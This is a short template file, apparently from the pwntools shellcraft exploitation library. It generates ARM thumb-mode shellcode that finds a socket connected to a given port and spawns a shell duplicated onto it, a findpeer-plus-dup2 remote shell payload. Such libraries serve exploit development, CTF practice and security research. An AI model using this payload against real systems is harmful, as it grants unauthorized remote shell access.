<% from pwnlib.shellcraft import arm, common %>
<%page args="port=None"/>
<%docstring>
Args: port (defaults to any)
    Finds an open socket which connects to a specified
	port, and then opens a dup2 shell on it in thumb mode
</%docstring>

${arm.linux.thumb_findpeer(port)}
${arm.linux.thumb_dupsh('r0')}
